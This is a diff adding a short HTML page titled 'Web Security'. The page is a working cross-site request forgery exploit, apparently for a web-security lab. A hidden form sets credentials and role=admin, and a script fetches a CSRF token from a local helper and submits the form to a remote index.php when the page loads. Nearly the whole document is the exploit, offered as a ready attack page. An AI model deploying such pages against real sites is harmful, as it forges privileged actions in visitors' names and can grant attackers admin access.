@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Security</title>
+</head>
+<body>
+    <form id="postForm" action="http://193.226.5.99/websec4/index.php" method="POST">
+            <input type="hidden" name="username" value="b.mitroi">
+            <input type="hidden" name="password" value="bmitroi">
+            <input type="hidden" name="role" value="admin">
+            <input type="hidden" name="csrf" id="csrfField" value="">
+        </form>
+    <script>
+        fetch('http://localhost:3000/csrf_token')
+        .then(response => response.text())
+        .then(token => {
+            document.getElementById('csrfField').value = token.trim();
+            document.getElementById("postForm").submit();
+        })
+        .catch(err => console.error('Error fetching CSRF token:', err));
+</script>
+    
+</body>
+</html>
